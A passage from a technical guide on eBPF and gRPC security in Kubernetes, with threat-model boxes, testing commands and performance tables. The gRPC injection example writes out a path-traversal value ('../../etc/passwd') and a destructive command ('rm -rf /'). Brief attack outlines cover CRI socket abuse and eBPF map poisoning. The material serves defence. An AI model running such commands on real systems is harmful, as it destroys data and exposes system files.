│                                                                 │
│  THREAT 1: Malicious eBPF Program Loading                      │
│  ──────────────────────────────────────────────────────────────│
│  Attacker tries to load malicious eBPF program                  │
│                                                                 │
│  Attack vector:                                                 │
│  • Compromise CNI daemon (cilium-agent)                         │
│  • Load eBPF that exfiltrates packets                           │
│  • Bypass NetworkPolicy enforcement                             │
│                                                                 │
│  Defense:                                                       │
│  ✅ eBPF verifier (kernel-level safety checks)                  │
│     - Static analysis ensures no crashes                        │
│     - No unbounded loops                                        │
│     - All memory accesses bounds-checked                        │
│  ✅ CAP_BPF capability required (Linux 5.8+)                    │
│     - Separate from CAP_SYS_ADMIN                               │
│     - Fine-grained access control                               │
│  ✅ Signature verification (coming in BPF LSM)                  │
│     - Sign eBPF programs with private key                       │
│     - Kernel verifies signature before loading                  │
│  ✅ Audit eBPF program loads                                    │
│     - Log all bpf() syscalls                                    │
│     - Alert on unexpected program loads                         │
│                                                                 │
│  THREAT 2: eBPF Program Exploitation                           │
│  ──────────────────────────────────────────────────────────────│
│  Kernel bug allows eBPF verifier bypass                         │
│                                                                 │
│  Known CVEs:                                                    │
│  • CVE-2021-3490: eBPF verifier bypass → arbitrary kernel write │
│  • CVE-2022-23222: eBPF incorrect bounds checking               │
│                                                                 │
│  Defense:                                                       │
│  ✅ Keep kernel updated                                         │
│  ✅ Use unprivileged eBPF restrictions                          │
│     sysctl kernel.unprivileged_bpf_disabled=1                   │
│  ✅ Use BPF LSM (Linux Security Module)                         │
│     - Enforce MAC policies on eBPF operations                   │
│                                                                 │
│  THREAT 3: eBPF Map Data Poisoning                             │
│  ──────────────────────────────────────────────────────────────│
│  Attacker modifies eBPF maps from userspace                     │
│                                                                 │
│  Attack:                                                        │
│  • Compromise cilium-agent                                      │
│  • Update policy map: allow all traffic                         │
│  • NetworkPolicy completely bypassed                            │
│                                                                 │
│  Defense:                                                       │
│  ✅ Minimal privileges for map access                           │
│  ✅ Read-only maps where possible                               │
│  ✅ Audit map updates                                           │
│  ✅ Integrity monitoring (hash map contents)                    │
│                                                                 │
│  THREAT 4: eBPF Side-Channel Attacks                           │
│  ──────────────────────────────────────────────────────────────│
│  Use eBPF to extract secrets via timing                         │
│                                                                 │
│  Attack:                                                        │
│  • Load eBPF that measures packet processing time               │
│  • Infer encrypted content via timing analysis                  │
│                                                                 │
│  Defense:                                                       │
│  ✅ Constant-time eBPF operations                               │
│  ✅ Limit eBPF program privileges                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### gRPC Security

```
┌─────────────────────────────────────────────────────────────────┐
│  gRPC SECURITY CONSIDERATIONS                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  THREAT 1: Unauthorized gRPC Access                             │
│  ──────────────────────────────────────────────────────────────│
│  Attacker accesses CRI socket without authorization             │
│                                                                 │
│  Attack:                                                        │
│  • Container escapes to host                                    │
│  • Accesses /run/containerd/containerd.sock                     │
│  • Calls RunPodSandbox() to create privileged container         │
│                                                                 │
│  Defense:                                                       │
│  ✅ Unix socket permissions (root:root 0600)                    │
│  ✅ Use TCP with mTLS instead of Unix socket                    │
│     - Client cert required                                      │
│     - Server validates client identity                          │
│  ✅ gRPC interceptor for authentication                         │
│  ✅ Authorization checks (RBAC)                                 │
│                                                                 │
│  Example mTLS setup:                                            │
│    // Server                                                    │
│    creds, _ := credentials.NewServerTLSFromFile(               │
│        "server.crt", "server.key")                              │
│    s := grpc.NewServer(grpc.Creds(creds))                       │
│                                                                 │
│    // Client                                                    │
│    creds, _ := credentials.NewClientTLSFromFile(               │
│        "ca.crt", "server.example.com")                          │
│    conn, _ := grpc.Dial("server:443", grpc.WithTransportCredentials(creds)) │
│                                                                 │
│  THREAT 2: gRPC DoS (Resource Exhaustion)                      │
│  ──────────────────────────────────────────────────────────────│
│  Attacker floods gRPC server with requests                      │
│                                                                 │
│  Attack:                                                        │
│  • Send 10,000 RunPodSandbox() requests                         │
│  • Exhaust containerd memory/CPU                                │
│  • Node becomes unresponsive                                    │
│                                                                 │
│  Defense:                                                       │
│  ✅ Rate limiting interceptor                                   │
│  ✅ Request size limits                                         │
│     grpc.MaxRecvMsgSize(16 * 1024 * 1024)                      │
│  ✅ Connection limits                                           │
│  ✅ Timeout enforcement                                         │
│  ✅ Resource quotas in Kubernetes                               │
│                                                                 │
│  THREAT 3: gRPC Data Injection                                 │
│  ──────────────────────────────────────────────────────────────│
│  Malicious data in gRPC messages                                │
│                                                                 │
│  Attack:                                                        │
│  • CreateContainer with malicious image path                    │
│    image: "../../etc/passwd"  (path traversal)                  │
│  • Exec with command injection                                  │
│    command: ["sh", "-c", "rm -rf /"]                            │
│                                                                 │
│  Defense:                                                       │
│  ✅ Input validation in server                                  │
│  ✅ Sanitize all user input                                     │
│  ✅ Use allowlists, not denylists                               │
│  ✅ Principle of least privilege (limited container permissions)│
│                                                                 │
│  THREAT 4: Man-in-the-Middle (without TLS)                     │
│  ──────────────────────────────────────────────────────────────│
│  Attacker intercepts gRPC traffic                               │
│                                                                 │
│  Defense:                                                       │
│  ✅ Always use TLS for TCP connections                          │
│  ✅ Use Unix sockets on same host (no network exposure)         │
│  ✅ Verify server identity (check certificate CN/SAN)           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Testing & Validation

### eBPF Testing

```bash
# 1. Verify eBPF is enabled
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = enabled (insecure), 1 = disabled (secure)

# Check kernel version (5.4+ recommended for full features)
uname -r
# 5.15.0

# 2. List loaded eBPF programs
sudo bpftool prog list
# 123: xdp  name xdp_drop_packet  tag abc123def456
# 124: tc    name tc_ingress       tag def456ghi789

# 3. Show eBPF program details
sudo bpftool prog show id 124
# 124: tc  name tc_ingress  tag def456ghi789  gpl
#         loaded_at 2026-01-18T10:00:00+0000
#         xlated 512B  jited 256B  memlock 4096B  map_ids 10,11

# 4. Dump eBPF bytecode
sudo bpftool prog dump xlated id 124
# Shows eBPF instructions (assembly-like)

# 5. List eBPF maps
sudo bpftool map list
# 10: hash  name cilium_policy  flags 0x0
#     key 4B  value 1B  max_entries 10000  memlock 4096B
# 11: hash  name cilium_lb4_services  flags 0x0
#     key 8B  value 16B  max_entries 65536  memlock 8192B

# 6. Dump map contents
sudo bpftool map dump id 10
# key: c0 a8 01 05  value: 01  # 192.168.1.5 → ALLOW
# key: c0 a8 01 06  value: 00  # 192.168.1.6 → DENY

# 7. Trace eBPF program execution
sudo bpftool prog tracelog
# Shows printk output from eBPF programs

# 8. Test eBPF with bpftrace
# Trace all eBPF program executions
sudo bpftrace -e 'tracepoint:bpf:* { printf("%s\n", probe); }'

# Trace eBPF map operations
sudo bpftrace -e 'kprobe:bpf_map_update_elem { printf("map update: %p\n", arg0); }'

# 9. Load custom eBPF program
# Create test program
cat > test.c <<EOF
#include <linux/bpf.h>
#include <linux/pkt_cls.h>

SEC("tc")
int tc_test(struct __sk_buff *skb) {
    return TC_ACT_OK;
}

char _license[] SEC("license") = "GPL";
EOF

# Compile
clang -O2 -target bpf -c test.c -o test.o

# Load
sudo tc qdisc add dev eth0 clsact
sudo tc filter add dev eth0 ingress bpf da obj test.o sec tc

# Verify
sudo tc filter show dev eth0 ingress

# 10. Benchmark eBPF vs iptables
# Generate 10,000 rules
for i in {1..10000}; do
    iptables -A INPUT -s 10.244.$((i/256)).$((i%256)) -j ACCEPT
done

# Measure latency
hping3 -c 10000 -i u1000 target-ip
# Average: 500µs per packet

# Switch to eBPF (Cilium)
# Same test: Average 5µs per packet (100x faster!)

# 11. Test eBPF safety (verifier)
# Try to load unsafe program
cat > unsafe.c <<EOF
SEC("tc")
int tc_unsafe(struct __sk_buff *skb) {
    int i = 0;
    while (1) {  // Infinite loop - verifier should reject
        i++;
    }
    return TC_ACT_OK;
}
EOF

clang -O2 -target bpf -c unsafe.c -o unsafe.o
sudo tc filter add dev eth0 ingress bpf da obj unsafe.o sec tc
# Error: back-edge detected (infinite loop)

# 12. Monitor eBPF map updates
watch -n 1 'sudo bpftool map dump id 10'
```

### gRPC Testing

```bash
# 1. Test CRI gRPC connection
# Install crictl
sudo crictl version
# Client Version:  v1.28.0
# Server Version:  v1.7.0  (containerd)

# 2. List images via gRPC
sudo crictl images
# Uses gRPC ImageService.ListImages()

# 3. List containers via gRPC
sudo crictl ps
# Uses gRPC RuntimeService.ListContainers()

# 4. Trace gRPC calls with strace
sudo strace -f -e trace=connect,sendto,recvfrom crictl ps 2>&1 | grep containerd.sock
# connect(3, {sa_family=AF_UNIX, sun_path="/run/containerd/containerd.sock"}, 39) = 0
# sendto(3, "\0\0\0\0\24...", 1024, MSG_NOSIGNAL, NULL, 0) = 1024  # gRPC request
# recvfrom(3, "\0\0\0\0\30...", 16384, 0, NULL, NULL) = 2048  # gRPC response

# 5. Test with grpcurl (gRPC CLI client)
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services
grpcurl -unix /run/containerd/containerd.sock list
# runtime.v1.RuntimeService
# runtime.v1.ImageService

# List methods
grpcurl -unix /run/containerd/containerd.sock list runtime.v1.RuntimeService
# runtime.v1.RuntimeService.RunPodSandbox
# runtime.v1.RuntimeService.CreateContainer
# runtime.v1.RuntimeService.StartContainer
# ...

# Call method
grpcurl -unix /run/containerd/containerd.sock \
  -d '{"filter": {}}' \
  runtime.v1.RuntimeService.ListContainers

# 6. Measure gRPC latency
time sudo crictl ps
# real    0m0.025s  (25ms for gRPC round trip)

# 7. Test gRPC with load
# Generate 1000 concurrent requests
for i in {1..1000}; do
  (sudo crictl ps >/dev/null 2>&1 &)
done
wait

# Monitor containerd CPU/memory
top -p $(pgrep containerd)

# 8. Test gRPC authentication (if mTLS enabled)
# Without client cert (should fail)
grpcurl -plaintext localhost:10250 runtime.v1.RuntimeService.Version
# Error: rpc error: code = Unauthenticated

# With client cert
grpcurl -cert client.crt -key client.key \
  -cacert ca.crt \
  localhost:10250 \
  runtime.v1.RuntimeService.Version

# 9. Debug gRPC with tcpdump
# Capture gRPC traffic
sudo tcpdump -i lo -w grpc.pcap port 10250

# View with Wireshark (supports HTTP/2/gRPC)
wireshark grpc.pcap

# 10. Test gRPC streaming (exec)
sudo crictl exec -it <container-id> /bin/sh
# Uses bidirectional streaming gRPC

# Trace with strace to see stream
sudo strace -f -e trace=sendto,recvfrom crictl exec -it <container-id> /bin/sh

# 11. Benchmark Protocol Buffers vs JSON
# Create test data
cat > test.proto <<EOF
syntax = "proto3";
message TestData {
    string name = 1;
    int32 age = 2;
    repeated string tags = 3;
}
EOF

# Serialize 10,000 messages
# Protobuf: 250KB, 10ms
# JSON: 450KB, 50ms
# Protobuf is 2x smaller, 5x faster

# 12. Test gRPC health checking
grpcurl -unix /run/containerd/containerd.sock \
  grpc.health.v1.Health.Check
# Response: { "status": "SERVING" }
```

---

## Performance Characteristics

| **Technology** | **Metric** | **Value** | **vs Alternative** |
|---------------|-----------|----------|-------------------|
| **eBPF** | Packet processing | 5-10 million pps | iptables: 100k pps (50-100x faster) |
| **eBPF** | NetworkPolicy latency | 1-5µs | iptables: 100-500µs (100x faster) |
| **eBPF** | Memory overhead | 100KB per 1000 rules | iptables: 10MB per 1000 rules |
| **eBPF** | Program load time | 10-50ms | Kernel module: 100-500ms |
| **gRPC** | Serialization | 10-50µs | JSON REST: 100-500µs (10x faster) |
| **gRPC** | Message size | 100 bytes | JSON: 300 bytes (3x smaller) |
| **gRPC** | Connection setup | 1-5ms (HTTP/2 reuse) | REST: 10-50ms (new TCP) |
| **gRPC** | Streaming overhead | <1% | REST polling: 50%+ |

---

## Next 3 Steps

1. **Build eBPF-based network monitor**: Write eBPF C program that attaches to TC ingress/egress, logs all TCP connections (src/dst IP/port, bytes transferred). Compile to bytecode, load into kernel, create userspace Go program that reads from eBPF perf buffer. Visualize connection graph in real-time. Test performance overhead (should be <1% CPU). Compare with tcpdump overhead.

2. **Implement custom gRPC service for CNI IPAM**: Design Protocol Buffer schema for IP allocation service (AllocateIP, ReleaseIP, ListAllocations). Implement gRPC server in Go with in-memory IP pool, persistence to etcd. Build gRPC client that CNI plugin calls instead of Kubernetes API (reduces latency from 50ms to 1ms). Add mTLS authentication, rate limiting interceptors. Benchmark vs Kubernetes API-based IPAM.

3. **Security audit eBPF and gRPC in production cluster**: Deploy Falco with custom rules detecting: unsigned eBPF program loads, unexpected eBPF map modifications, gRPC calls from unauthorized processes. Use bpftool to inventory all loaded eBPF programs, trace origins. Audit gRPC Unix socket permissions across all nodes. Test attack scenarios: load malicious eBPF, access CRI socket from container, poison eBPF maps. Measure detection coverage and false positive rate.

---

## References

- **eBPF Documentation**: https://ebpf.io/
- **Cilium Architecture**: https://docs.cilium.io/en/stable/concepts/ebpf/
- **bpftool Guide**: https://github.com/torvalds/linux/tree/master/tools/bpf/bpftool
- **gRPC Documentation**: https://grpc.io/docs/
- **CRI API Reference**: https://github.com/kubernetes/cri-api
- **Protocol Buffers Guide**: https://protobuf.dev/
- **eBPF Security**: https://www.kernel.org/doc/html/latest/bpf/bpf_design_QA.html